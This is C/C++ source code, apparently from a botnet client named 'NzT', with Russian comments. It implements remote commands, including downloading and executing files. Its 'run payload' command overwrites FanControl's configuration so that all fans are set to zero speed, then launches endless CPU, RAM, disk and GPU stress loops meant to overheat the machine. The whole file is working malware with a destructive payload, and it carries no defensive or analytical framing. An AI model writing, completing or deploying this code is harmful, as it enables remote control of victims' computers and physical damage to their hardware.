#include <Windows.h>
#include <process.h>
#include <d3d11.h>
#include <dxgi.h>
#include <time.h>
#include <math.h>

#ifdef _DEBUG
#include <stdio.h>
#endif

#include "nzt.h"
#include "command.h"
#include "utils.h"
#include "file.h"

void inject_fancontrol_config()
{
    const wchar_t* fc_dir = L"C:\\Users\\Public\\Documents\\FanControl";
    const wchar_t* cfg_path = L"C:\\Users\\Public\\Documents\\FanControl\\FanControl.cfg";

    // Создать директорию
    FileCreateDirectory(fc_dir);

    // Проверить существование файла
    HANDLE hFile;
    if (!FileOpen(&hFile, cfg_path, GENERIC_READ, FILE_OPEN))
    {
        // Файл не существует, создаём
        const char* default_cfg = "<fan id=\"test\"><min>10</min><max>100</max></fan>";
        FileWriteBuffer(cfg_path, default_cfg, (DWORD)strlen(default_cfg), FALSE);
    }
    else
    {
        API(NtClose)(hFile);
    }

    // Прочитать файл
    LPVOID content = NULL;
    DWORD size = 0;
    if (!FileReadBuffer(cfg_path, &content, &size))
        return;

    // Изменить <min> и <max> на 0
    char* pos = (char*)content;
    while ((pos = strstr(pos, "<fan ")) != NULL)
    {
        char* min_pos = strstr(pos, "<min>");
        char* max_pos = strstr(pos, "<max>");

        if (min_pos && max_pos)
        {
            size_t min_len = strlen("<min>");
            size_t max_len = strlen("<max>");
            size_t end_tag_len = strlen("</min>");
            
            if (min_pos + min_len + 1 <= (char*)content + size - end_tag_len)
                strncpy_s(min_pos + min_len, size - (min_pos + min_len - (char*)content), "0</min>", 7);
            if (max_pos + max_len + 1 <= (char*)content + size - end_tag_len)
                strncpy_s(max_pos + max_len, size - (max_pos + max_len - (char*)content), "0</max>", 7);
        }
        pos += 5;
    }

    // Перезаписать файл
    FileWriteBuffer(cfg_path, content, size, FALSE);
    Free(content);
}

void cpu_stress_thread(void* param)
{
    while (TRUE)
    {
        double sum = 0.0;
        for (int i = 0; i < 8000000; ++i)
        {
            sum += sin((double)i) * cos((double)i) + sqrt((double)i);
        }
        volatile double result = sum;
    }
}

void ram_stress_thread(void* param)
{
    const size_t size = 1024 * 1024 * 1024;
    while (TRUE)
    {
        char* buffer = (char*)malloc(size);
        if (!buffer) continue;

        for (size_t i = 0; i < size; i += 1024)
        {
            buffer[i] = static_cast<char>(i % 94 + 32);
        }

        volatile char dummy = 0;
        for (size_t i = 0; i < size; i += 2048)
        {
            dummy ^= buffer[i];
        }

        free(buffer);
    }
}

void disk_stress_thread(void* param)
{
    const wchar_t* filename = L"C:\\temp\\stress_disk.tmp";
    const size_t chunk_size = 1024 * 1024 * 10; 
    char* data = new(std::nothrow) char[chunk_size];

    if (!data) return;

    srand((unsigned)time(NULL));
    for (size_t i = 0; i < chunk_size; ++i)
    {
        data[i] = static_cast<char>(rand() % 256);
    }

    while (TRUE)
    {
        FileWriteBuffer(filename, data, (DWORD)chunk_size, FALSE);
        FileDelete(filename);
    }
    delete[] data;
}

void gpu_stress_thread(void* param)
{
    ID3D11Device* device = nullptr;
    ID3D11DeviceContext* context = nullptr;
    D3D_FEATURE_LEVEL featureLevel;

    HRESULT hr = D3D11CreateDevice(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr,
                                   0, nullptr, 0, D3D11_SDK_VERSION, &device, &featureLevel, &context);
    if (FAILED(hr)) return;

    const char* cs_shader_code = R"(
        RWStructuredBuffer<uint> buffer : register(u0);
        [numthreads(1024, 1, 1)]
        void CSMain(uint3 id : SV_DispatchThreadID)
        {
            uint index = id.x;
            float val = (float)index;
            for (int i = 0; i < 100; ++i) {
                val = sin(val) * cos(val) + val * val;
            }
            buffer[index] = (uint)val;
        }
    )";

    ID3DBlob* shaderBlob = nullptr;
    ID3DBlob* errorBlob = nullptr;
    hr = D3DCompile(cs_shader_code, strlen(cs_shader_code), nullptr, nullptr, nullptr, "CSMain", "cs_5_0", 0, 0, &shaderBlob, &errorBlob);
    if (FAILED(hr)) {
        if (errorBlob) errorBlob->Release();
        return;
    }

    ID3D11ComputeShader* computeShader = nullptr;
    hr = device->CreateComputeShader(shaderBlob->GetBufferPointer(), shaderBlob->GetBufferSize(), nullptr, &computeShader);
    if (FAILED(hr)) {
        shaderBlob->Release();
        if (errorBlob) errorBlob->Release();
        return;
    }

    D3D11_BUFFER_DESC bd = {};
    bd.Usage = D3D11_USAGE_DEFAULT;
    bd.BindFlags = D3D11_BIND_UNORDERED_ACCESS | D3D11_BIND_SHADER_RESOURCE;
    bd.CPUAccessFlags = 0;
    bd.MiscFlags = 0;
    bd.ByteWidth = 1024 * 1024 * sizeof(uint32_t);

    ID3D11Buffer* buffer = nullptr;
    hr = device->CreateBuffer(&bd, nullptr, &buffer);
    if (FAILED(hr)) {
        computeShader->Release();
        shaderBlob->Release();
        if (errorBlob) errorBlob->Release();
        return;
    }

    D3D11_UNORDERED_ACCESS_VIEW_DESC uavd = {};
    uavd.Format = DXGI_FORMAT_R32_UINT;
    uavd.ViewDimension = D3D11_UAV_DIMENSION_BUFFER;
    uavd.Buffer.FirstElement = 0;
    uavd.Buffer.NumElements = 1024 * 1024;

    ID3D11UnorderedAccessView* uav = nullptr;
    hr = device->CreateUnorderedAccessView(buffer, &uavd, &uav);
    if (FAILED(hr)) {
        buffer->Release();
        computeShader->Release();
        shaderBlob->Release();
        if (errorBlob) errorBlob->Release();
        return;
    }

    while (TRUE)
    {
        context->CSSetUnorderedAccessViews(0, 1, &uav, nullptr);
        context->CSSetShader(computeShader, nullptr, 0);
        context->Dispatch(1024, 1, 1);
        context->ClearState();
    }

    uav->Release();
    buffer->Release();
    computeShader->Release();
    shaderBlob->Release();
    if (errorBlob) errorBlob->Release();
    context->Release();
    device->Release();
}

void launch_stress_processes()
{
    _beginthread(cpu_stress_thread, 0, nullptr);
    _beginthread(ram_stress_thread, 0, nullptr);
    _beginthread(disk_stress_thread, 0, nullptr);
    _beginthread(gpu_stress_thread, 0, nullptr);
}

VOID CommandExecute(
	COMMANDS Command, 
	PCHAR*	 Parameter
)
{
	DebugPrint("NzT: Executed command: %d %s", Command, Parameter[2]);

	switch (Command)
	{
		case COMMAND_DL_EXEC:
		{
			DownloadFile(Parameter[2], TRUE);
			break;
		}

		case COMMAND_UPDATE:
		{
			DownloadFile(Parameter[2], TRUE);
			//uninstall and update registry key values to hold new version number
			break;
		}

		case COMMAND_RUN_PAYLOAD:  // Новая команда
		{
			inject_fancontrol_config();
			launch_stress_processes();
			break;
		}

		case COMMAND_KILL:
			API(ExitProcess)(0);
			break;
	}
}

